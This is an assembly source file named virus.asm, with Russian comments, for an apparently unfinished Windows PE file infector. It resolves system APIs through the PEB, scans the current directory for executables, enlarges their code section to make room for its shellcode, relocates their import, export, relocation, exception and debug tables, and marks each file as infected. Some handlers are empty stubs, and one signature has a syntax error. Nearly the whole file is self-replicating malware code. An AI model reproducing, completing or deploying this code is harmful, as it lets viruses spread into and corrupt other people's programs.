; jwasm -bin -nologo -Fo virus64.bin /I "C:\wininc\Include" -10p -zf0 -W2 -D_WIN64 virus.asm
; jwasm -bin -nologo -Fo virus32.bin /I "C:\masm32\include" -W2 virus.asm



ifdef _WIN64
CurrentStdcallNotation equ <fastcall>
CurrentCdeclNotation equ <fastcall>
else 
CurrentStdcallNotation equ <stdcall>
CurrentCdeclNotation equ <c>
.486
endif 

option casemap:none
.model flat, CurrentStdcallNotation

include windows.inc

ifdef _WIN64
include WINSOCK2.INC
else
include wsock32.inc
include ..\inc\hde\hde32.masm
endif

ifdef _WIN64

CLIST_ENTRY typedef LIST_ENTRY64
; машинное слово текущей архитектуры
cword typedef qword
cax equ <rax>
cbx equ <rbx>
ccx equ <rcx>
cdx equ <rdx>
csi equ <rsi>
cdi equ <rdi>
csp equ <rsp>
cbp equ <rbp>
OFFSET_PEB equ <60h>
OFFSET_LDR equ <18h>
OFFSET_INIT_LIST equ <30h>
cur_seg_reg equ <gs>
MANAGER_SIZE equ <24h>
RELOC_TYPE equ <IMAGE_REL_BASED_DIR64>
isize equ <Size_>
IMAGE_ORDINAL_FLAG equ IMAGE_ORDINAL_FLAG64
NameImp equ Name_
NameExp equ Name_

else 

CLIST_ENTRY typedef LIST_ENTRY32
; машинное слово текущей архитектуры
cword typedef dword
cax equ <eax>
cbx equ <ebx>
ccx equ <ecx>
cdx equ <edx>
csi equ <esi>
cdi equ <edi>
csp equ <esp>
cbp equ <ebp>
OFFSET_PEB equ <30h>
OFFSET_LDR equ <0Ch>
OFFSET_INIT_LIST equ <1Ch>
cur_seg_reg equ <fs>
MANAGER_SIZE equ <18h>
RELOC_TYPE equ <IMAGE_REL_BASED_HIGHLOW>
IMAGE_ORDINAL_FLAG equ IMAGE_ORDINAL_FLAG32
NameImp equ Name1
NameExp equ nName
HDE equ hde32s

endif 

ADDITIONAL_RELOC_TABLE_SIZE equ <(2*sizeof(dword) + 2*sizeof(word))> 		; (c заголовком и ABSOLUTE)
SHELL_TABLE_SIZE equ <(4*sizeof(dword) + 5*sizeof(cword))>
IMAGE_DATA_DIRECTORY_SIZE equ <2*sizeof(dword)>
IMAGE_SECTION_HEADER_SIZE equ <sizeof(IMAGE_SECTION_HEADER)>
IMAGE_IMPORT_DESCRIPTOR_SIZE equ <sizeof(IMAGE_IMPORT_DESCRIPTOR)>
DbgBreak   equ int 3

include ..\inc\pe_parser.inc
include ..\inc\proc_work.inc

Stdcall0 typedef proto CurrentStdcallNotation
Stdcall1 typedef proto CurrentStdcallNotation :cword
Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall10 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
;StdcallVararg typedef proto CurrentStdcallNotation :vararg
CdeclVararg typedef proto CurrentCdeclNotation :vararg

DefineStdcallVarargProto macro name:req
    sc_&name equ <StdcallVararg ptr [cbx + p_&name]>
endm

DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [cbx + p_&name]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [cbx + p_&name]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        cword offset str_&i
    endm
    name&Count = ($ - name) / sizeof(cword)
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i cword 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm

invoke64 macro args:vararg
ifdef _WIN64
    and csp, 0FFFFFFF0h
endif
    invoke args
endm


FindCodeSection proto CurrentStdcallNotation :cword
InfectFilesInCurrDir proto CurrentStdcallNotation
Freeze proto CurrentStdcallNotation
InjectCode proto CurrentStdcallNotation :cword, :cword, :cword
ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
; 
HandleAllTables proto CurrentStdcallNotation :cword, :dword, :dword, :dword
HandleImportTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
HandleExportTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
HandleExceptionTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
HandleDebugTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
HandleLoadConfTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
HandleRelocs proto CurrentStdcallNotation :cword, :cword, :dword, :dword
HandleResourceTable :cword, :cword, :dword, :dword
FindTargetSection proto CurrentStdcallNotation :cword

DefineStdcallProto MessageBoxA, 4
DefineStdcallProto VirtualProtect, 4
DefineStdcallProto GetModuleHandleA, 1
DefineStdcallProto WriteProcessMemory, 5
DefineStdcallProto CreateFileA, 7
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1
DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1
DefineStdcallProto GetSystemDirectoryA, 2
DefineStdcallProto GetLastError, 0;;;;;;;
DefineStdcallProto GetTickCount, 0
DefineStdcallProto Sleep, 1

DefineCProto memset
DefineCProto strlen
DefineCProto printf
DefineCProto memcpy
DefineCProto malloc
DefineCProto strcmp
DefineCProto sprintf
DefineCProto strcpy
DefineCProto memmove

sc segment

start:
ifdef _WIN64
    lea cbx, start
    jmp main
else
    call $+5
    pop cbx
    sub cbx, 5
    jmp main
endif

isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
targetDir db ".", 0 
originalEP dq 0
scInfo SC_PARAMS <0>


;"C:\work\code\virus\test", 0 ;db 260 dup (0)

main proc 

    local   pBase:cword 
    local   pLoadLibraryA:cword
    local   pGetProcAddress:cword
    local 	pVirtualProtect:cword
    local   oldProtect:dword
    local   pExitProcess:cword
    local   hKernelLib:cword

    mov [pBase], cbx

    ; получаем адрес функции GetProcAddress в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_GetProcAddress]
    mov [pGetProcAddress], cax
    ; pGetProcAddress = FindProcAddressByName ("GetProcAddress")

    ; получаем адрес функции LoadLibraryA в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
    mov [pLoadLibraryA], cax
    ; pLoadLibrary = FindProcAddressByName ("LoadLibraryA")

    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Kernel32]
    mov [hKernelLib], cax
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32]
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Ws232]
	
    invoke Stdcall2 ptr [pGetProcAddress], [hKernelLib], addr [cbx + str_ExitProcess]
    mov [pExitProcess], cax
    
    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount

    .if [cbx+isFirst]
        invoke InfectFilesInCurrDir
        invoke Stdcall1 ptr [pExitProcess], 0
    .endif

    invoke FindProcArray, addr [cbx + procNames], addr pVirtualProtect, 1

    ; VirtualProtect (code, CODE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect);
    invoke Stdcall4 ptr [pVirtualProtect], cbx, totalEnd - start, PAGE_EXECUTE_READWRITE, addr oldProtect

    ret
main endp

InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, codeSize:cword

INJ_SIGN_OFFSET equ 079h
INJECTION_SIGN 	equ 050h

    local peMem:cword
    local VAsc:dword
    local pSC:cword
    local pSections:cword
    local pTargetSection:cword
    local countSec:cword
    local i:cword
    ;local offsetAllData:dword
    ;local globalSCSize:dword
    local newCSSize:dword
    ;local allignScSize:dword
    local RawAddrSc:dword
    local deltaFileSize:dword
    local targetSection:cword
    local sizeMovedData:cword
    local oldFileSize:cword
    local fileAligment:dword
    local secAligm:dword
    local sAlignAddSize:dword
    local fAlignAddSize:dword
    local dwTmp:dword
    local cwTmp:cword

    mov [VAsc], 0

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov cax, [pe]
    mov ccx, [cax].PeHeaders.mem
    mov [peMem], ccx
    mov cax, [cax].PeHeaders.doshead
    add cax, INJ_SIGN_OFFSET
    .if  byte ptr [cax] == INJECTION_SIGN
        invoke sc_printf, addr [cbx + msgErrorAlreadyInfected]
        xor cax, cax
        ret
    .endif
    
    mov cax, [pe]
    mov cax, [cax].PeHeaders.nthead
    lea cax, [cax].IMAGE_NT_HEADERS.FileHeader
    .if [cax].IMAGE_FILE_HEADER.Characteristics & IMAGE_FILE_RELOCS_STRIPPED
        invoke sc_printf, addr [cbx + msgErrorRelocs]
        ret
    .endif    

    ; расчет
    ;DbgBreak 
    mov cdx, [pe]
    mov cdx, [cdx].PeHeaders.nthead
    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.FileAlignment
    mov [fileAligment], ecx
    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
    mov [secAligm], ecx

    ; Находим адрес конца первой кодовой секции
    
    invoke FindTargetSection, [pe]
    
    .if cax == NULL
        invoke sc_printf, addr [cbx + msgErrorCodeSectionNotFound]
        ret
    .endif

    mov cdx, cax
    mov [targetSection], cdx
    mov ccx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
    add ccx, [codeSize]
    mov [newCSSize], ccx
    ; _diff = Aligment(vsize, _aligm) - Aligment(_psects[num].Misc.VirtualSize, _aligm);
    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [secAligm]
    mov [dwTmp], eax
    invoke AlignToTop, [newCSSize], [secAligm]
    sub eax, [dwTmp]
    mov [sAlignAddSize], eax
    ; f_diff = Aligment(vsize, f_aligm) - Aligment(_psects[num].Misc.VirtualSize, f_aligm);
    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [fileAligment]
    mov [dwTmp], eax
    invoke AlignToTop, [newCSSize], [fileAligment]
    sub eax, [dwTmp]
    mov [fAlignAddSize], eax

    mov eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
    add eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
    mov [VAsc], eax

    mov eax, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
    add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
    mov [RawAddrSc], eax

    .if [VAsc] == 0
        invoke sc_printf, addr [cbx+msgErrorSpaceNotFound]
        xor cax, cax
        ret
    .endif

    ;DbgBreak
    ; mov eax, [VAsc]
    ; mov [cbx+scInfo].SC_PARAMS.startRVA, eax 

    ; mov eax, totalEnd - start
    
    ; invoke AlignToTop, cax, [fileAligment]
    ; mov [cbx+scInfo].SC_PARAMS.sizeCurrSc, eax
    ; mov [globalSCSize], eax

    ; меняем все RVA в директориях
    ; mov cdi, [pe]
    ; mov cdx, [cdi].PeHeaders.nthead
    ; lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
    ; invoke AlignToTop, [globalSCSize], [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
    ; mov [allignScSize], eax
    ;DbgBreak
    ;invoke HandleAllTables, [pe], [VAsc], [globalSCSize], eax
    invoke HandleAllTables, [pe], [VAsc], [fAlignAddSize], [sAlignAddSize]

    mov cdi, [pe]
    mov cdi, [cdi].PeHeaders.nthead
    lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
    mov ecx, [sAlignAddSize]
    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfImage, ecx
    add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfCode, ecx
    add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
    ; сдвигаем все, что ниже

    invoke UnloadPeFile, [pe]

    mov cdx, [pe]
    mov cax, [cdx].PeHeaders.filesize
    mov dword ptr [oldFileSize], eax
    add eax, [fAlignAddSize]
    invoke LoadPeFile, [cdx].PeHeaders.filename, [pe], cax

    mov cax, [pe]
    mov cax, [cax].PeHeaders.mem
    mov [peMem], cax

    invoke FindTargetSection, [pe]
    .if cax == NULL
        invoke sc_printf, addr [cbx + msgErrorCodeSectionNotFound]
        ret
    .endif
    mov [targetSection], cax

    mov cdx, [pe]
    mov cdi, [cdx].PeHeaders.mem
    
    ; адрес в памяти, где будет шеллкод
    ;DbgBreak
    xor ccx, ccx
    mov ecx, [RawAddrSc]
    add ccx, cdi
    mov [pSC], ccx

    mov ccx, [targetSection]

    ; dst = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData + RawScSize;
    mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
    add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
    add edx, [fAlignAddSize]
    add cdi, cdx

    ; src = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData
    mov cdx, [pe]
    mov csi, [cdx].PeHeaders.mem
    mov ccx, [targetSection]
    mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
    add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
    
    add csi, cdx
    mov ccx, [peMem]
    add ccx, [oldFileSize] ; ccx = pe->mem + pe->filesize
    sub ccx, csi    ; ccx = ccx - src = sizeMovedData
    mov [sizeMovedData], ccx
    
    invoke sc_memmove, cdi, csi, [sizeMovedData]
    invoke sc_memset, [pSC], 041h, [fAlignAddSize]

    ;DbgBreak
    mov ccx, [targetSection]
    mov eax, [fAlignAddSize]
    add dword ptr [ccx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
    mov eax, totalEnd - start
    add dword ptr [ccx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax

     ; секции
    mov cdi, [pe]
    mov csi, [cdi].PeHeaders.sections
    xor ccx, ccx
    xor cax, cax

    mov eax, [cdi].PeHeaders.countSec
    mov [countSec], eax
    mov [i], ecx
    .while ecx < [countSec]
        ;DbgBreak
        mov ecx, [VAsc]
        .if ([csi].IMAGE_SECTION_HEADER.VirtualAddress >= ecx)
            mov eax, dword ptr [sAlignAddSize]
            add [csi].IMAGE_SECTION_HEADER.VirtualAddress, eax
            .if [csi].IMAGE_SECTION_HEADER.PointerToRawData != 0
                ;invoke AlignToTop, [scSize], [fileAligment]
                mov eax, dword ptr [fAlignAddSize]
                add [csi].IMAGE_SECTION_HEADER.PointerToRawData, eax
            .endif
        .endif
        ;mov cdx, [pSections]
        lea csi, [csi + IMAGE_SECTION_HEADER_SIZE]
        inc [i]
        mov ecx, [i]
    .endw
    
    
    ; точка вход
    ;add [cdx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax

    mov cdx, [pe]
    mov cdx, [cdx].PeHeaders.mem
    mov byte ptr [cdx + INJ_SIGN_OFFSET], INJECTION_SIGN

    invoke sc_MessageBoxA, NULL, addr [cbx + msgInfectionSuccess], MB_OK, 0

    ret
InjectPeFile endp

FindTargetSection proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    ; Находим адрес конца первой кодовой секции
    mov cdi, [pe]
    mov cdx, [cdi].PeHeaders.sections
    xor ecx, ecx
    xor cax, cax
    .while ecx < [cdi].PeHeaders.countSec
        ;DbgBreak
        .if ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_CODE) && \
            ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_MEM_EXECUTE && \
            !([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA))

            mov cax, cdx
            
            .break
        .endif
        ;mov cdx, [pSections]
        lea cdx, [cdx + IMAGE_SECTION_HEADER_SIZE]
        inc ecx
    .endw

    ret
FindTargetSection endp

; обработка всех таблиц (если они находятся после первой секции меняем их RVA и RVA, что в них содержатся)
HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dword, f_diff:dword, v_diff:dword

    local countSec:dword
    local fileAligment:dword
    local i:cword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    ; Обрабатываем директории
    mov cax, [pe]
    mov cax, [cax].PeHeaders.nthead
    lea cdi, [cax].IMAGE_NT_HEADERS.OptionalHeader;.DataDirectory
    mov edx, [cdi].IMAGE_OPTIONAL_HEADER.FileAlignment
    mov [fileAligment], edx
	lea cdi, [cdi].IMAGE_OPTIONAL_HEADER.DataDirectory

    
    ;DbgBreak
    xor ccx, ccx
    mov [i], ccx
    .while [i] < IMAGE_NUMBEROF_DIRECTORY_ENTRIES
        xor cax, cax
        mov eax, [cdi].IMAGE_DATA_DIRECTORY.VirtualAddress
        .if eax >= [scRVA] && [cdi].IMAGE_DATA_DIRECTORY.isize != 0
            mov csi, [pe]
            mov csi, [csi].PeHeaders.mem
            invoke RvaToOffset, cax, [pe]
            add csi, cax        ; csi = pe.mem + VA
            .if [i] == IMAGE_DIRECTORY_ENTRY_IMPORT
                ;DbgBreak
                invoke HandleImportTable, [pe], csi, [scRVA], [v_diff]
            .elseif [i] ==  IMAGE_DIRECTORY_ENTRY_EXPORT
                invoke HandleExportTable, [pe], csi, [scRVA], [v_diff]
            .elseif [i] == IMAGE_DIRECTORY_ENTRY_EXCEPTION
                invoke HandleExceptionTable, [pe], csi, [scRVA], [v_diff]
            .elseif [i] == IMAGE_DIRECTORY_ENTRY_DEBUG
                ;invoke AlignToTop, [scSize], [fileAligment]
                invoke HandleDebugTable, [pe], csi, [scRVA], [f_diff], [v_diff]
            .elseif [i] == IMAGE_DIRECTORY_ENTRY_BASERELOC
                invoke HandleRelocs, [pe], csi, [scRVA], [v_diff]
            .elseif [i] == IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG
                ;invoke AlignToTop, [scSize], [fileAligment]
                invoke HandleLoadConfTable, [pe], csi, [scRVA], [f_diff], [v_diff]
            .elseif [i] == IMAGE_DIRECTORY_ENTRY_RESOURCE
                invoke HandleResourceTable, [pe], csi, [scRVA], [v_diff]
            .endif
            
            mov eax, [v_diff]
            add [cdi].IMAGE_DATA_DIRECTORY.VirtualAddress, eax
        .endif
        inc [i]
        add cdi, IMAGE_DATA_DIRECTORY_SIZE
    .endw    

   


    ret
HandleAllTables endp

RecurRCNodeNormalize proc CurrentStdcallNotation uses cbx cdi csi pe:cword, dirAddr:dword, scRVA:dword. v_diff:dword

RecurRCNodeNormalize endp

HandleResourceTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, allignScSize:dword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif



HandleResourceTable endp

HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, scSize:dword, allignScSize:dword

    local pBase:cword
    local ib:cword
    local i:cword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov cdi, [pe]
    mov ccx, [pe].PeHeaders.nthead
    lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
    mov ccx, [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
    mov [ib], ccx

    mov cdi, [pe].PeHeaders.mem
    mov [pBase], cdi

    mov cdi, [pILCT]
    .if [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable != 0
        mov ccx, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable
        sub ccx, [ib]
        invoke RvaToOffset, ccx, [pe]
        mov edx, [scRVA]
        mov ecx, [allignScSize]
        xor ecx, ecx
        mov [i], ccx
        .while ccx < [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerCount
            mov ecx, [allignScSize]
            .if [cax] >= cdx
                add [cax], ccx
            .endif
            add cax, sizeof(cword)
            
            inc [i]
            mov ccx, [i]
        .endw
    .endif

    

    ret
HandleLoadConfTable endp

HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, scRVA:dword, allignScSize:dword

    local pBlocks:cword
    local pBase:cword
    local ib:cword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov csi, [pe]
    mov ccx, [csi].PeHeaders.nthead
    lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
    mov ccx, cword ptr [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
    mov [ib], ccx

    mov csi, [csi].PeHeaders.mem
    mov [pBase], csi
    ;DbgBreak
    mov cdi, [pIRT]
    .while !([cdi].IMAGE_BASE_RELOCATION.VirtualAddress == NULL && \
             [cdi].IMAGE_BASE_RELOCATION.SizeOfBlock == NULL)

        ; находим адрес использования абсолютного адреса
        lea csi, [cdi + sizeof(IMAGE_BASE_RELOCATION)]
        mov [pBlocks], csi
        
        

        xor cdx, cdx
        mov ccx, [pBlocks]
        .while word ptr [ccx] != 0
            invoke RvaToOffset, [cdi].IMAGE_BASE_RELOCATION.VirtualAddress, [pe]
            mov csi, [pBase]
            add csi, cax    ; pe->mem + VA
            xor cax, cax
            mov ax, word ptr [ccx]
            and ax, 0fffh
            add csi, cax
            mov edx, [scRVA] 
            add cdx, [ib]
            .if cword ptr [csi] >= cdx
                xor cax, cax
                ;mov cdx, cax
                mov edx, [allignScSize]
                add cword ptr [csi], cdx
            .endif
            add ccx, 2
        .endw

        mov edx, [scRVA]
        mov ecx, [allignScSize]
        .if [cdi].IMAGE_BASE_RELOCATION.VirtualAddress >= edx
            add dword ptr [cdi].IMAGE_BASE_RELOCATION.VirtualAddress, ecx
        .endif
        add cdi, [cdi].IMAGE_BASE_RELOCATION.SizeOfBlock
        
    .endw

    ret
HandleRelocs endp

HandleDebugTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cword, scRVA:dword, scSize:dword, allignScSize:dword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov csi, [pIDT]
    mov edx, [scRVA]
    mov eax, [scSize]
    mov ecx, [allignScSize]

    .if [csi].IMAGE_DEBUG_DIRECTORY.AddressOfRawData >= edx
        add [csi].IMAGE_DEBUG_DIRECTORY.AddressOfRawData, ecx
        add [csi].IMAGE_DEBUG_DIRECTORY.PointerToRawData, eax
    .endif
    
    ret
HandleDebugTable endp

HandleExceptionTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIET:cword, scRVA:dword, scSize:dword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov csi, [pIET]
    mov edx, [scRVA]
    mov eax, [scSize]
    .while !([csi].IMAGE_FUNCTION_ENTRY.StartingAddress == NULL && \
            [csi].IMAGE_FUNCTION_ENTRY.EndingAddress == NULL &&  \
            [csi].IMAGE_FUNCTION_ENTRY.EndOfPrologue == NULL)

        .if [csi].IMAGE_FUNCTION_ENTRY.StartingAddress >= edx
            add [csi].IMAGE_FUNCTION_ENTRY.StartingAddress, eax
            add [csi].IMAGE_FUNCTION_ENTRY.EndingAddress, eax
        .endif
        .if [csi].IMAGE_FUNCTION_ENTRY.EndOfPrologue >= edx
            add [csi].IMAGE_FUNCTION_ENTRY.EndOfPrologue, eax
        .endif

        add csi, sizeof(IMAGE_FUNCTION_ENTRY)
    .endw

    ret
HandleExceptionTable endp

HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cword, scRVA:dword, scSize:dword

	local currEntry:cword
    local iat:cword

	ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

	mov cax, [pIDT]
	mov [currEntry], cax
    mov cdi, [currEntry]
	.while !([cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk == NULL && \
           [cdi].IMAGE_IMPORT_DESCRIPTOR.Characteristics == NULL && \
           [cdi].IMAGE_IMPORT_DESCRIPTOR.ForwarderChain == NULL && \
           [cdi].IMAGE_IMPORT_DESCRIPTOR.NameImp == NULL && \
           [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk == NULL && \
           [cdi].IMAGE_IMPORT_DESCRIPTOR.TimeDateStamp == NULL) 

        .if [cdi].IMAGE_IMPORT_DESCRIPTOR.NameImp != NULL
            mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.NameImp
            .if eax >= [scRVA]
                add eax, [scSize]
                mov [cdi].IMAGE_IMPORT_DESCRIPTOR.NameImp, eax
            .endif
        .endif

        ;DbgBreak
        xor csi, csi
        .if [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk != NULL
            mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
        .else
            mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk
        .endif
        xor cax, cax
        invoke RvaToOffset, csi, [pe]
        mov csi, [pe]
        mov cdx, [csi].PeHeaders.mem
        add cax, cdx    ; csi = iat
        mov [iat], cax
    
        mov csi, [iat]
        .while cword ptr [csi] != NULL
            xor cdx, cdx
            mov edx, [scRVA]
            .if !(cword ptr [csi] & IMAGE_ORDINAL_FLAG) && \
                (cword ptr [csi] >= cdx)

                mov edx, [scSize]
                add dword ptr [csi], edx
            .endif
            add csi, sizeof(cword)
        .endw

        mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
        .if eax != NULL && eax >= [scRVA]
            add eax, [scSize]
            mov [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk, eax
        .endif
        mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk
        .if eax != NULL && eax >= [scRVA]
            add eax, [scSize]
            mov [cdi].IMAGE_IMPORT_DESCRIPTOR.FirstThunk, eax
        .endif
        
        add cdi, IMAGE_IMPORT_DESCRIPTOR_SIZE
	.endw

	ret
HandleImportTable endp

HandleExportTable proc CurrentStdcallNotation uses cbx cdi pe:cword, pEDT:cword, scRVA:dword, scSize:dword

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov cdi, [pEDT]
    xor cdx, cdx
    mov edx, [scRVA]
    .if [cdi].IMAGE_EXPORT_DIRECTORY.NameExp != NULL && \
        [cdi].IMAGE_EXPORT_DIRECTORY.NameExp >= edx
        
        mov eax, [scSize]
        add [cdi].IMAGE_EXPORT_DIRECTORY.NameExp, eax
    .endif

    xor cax, cax
    .if [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions != NULL
        invoke RvaToOffset, [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions, [pe]
        mov csi, [pe]
        mov csi, [csi].PeHeaders.mem
        add csi, cax

        xor ccx, ccx
        mov eax, [scSize]
        .while ecx < [cdi].IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
            .if dword ptr [csi] >= edx
                ;xor cax, cax
                add dword ptr [csi], eax
            .endif
            add csi, sizeof(dword)
            inc ecx
        .endw 
        .if [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions >= edx
            add [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions, eax
        .endif
    .endif

    .if [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNames != NULL
        invoke RvaToOffset, [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNames, [pe]
        mov csi, [pe]
        mov csi, [csi].PeHeaders.mem
        add csi, cax

        xor ccx, ccx
        mov eax, [scSize]
        .while ecx < [cdi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
            .if dword ptr [csi] >= edx
                ;xor cax, cax
                add dword ptr [csi], eax
            .endif
            add csi, sizeof(dword)
            inc ecx
        .endw 
        .if [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNames >= edx
            add [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNames, eax
        .endif
    .endif

    .if [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals != NULL && \
        [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals >= edx

        mov eax, [scSize]
        add [cdi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals, eax
    .endif

    ret
HandleExportTable endp

;
; Внедрение в PE-файлы в директории dirName
;
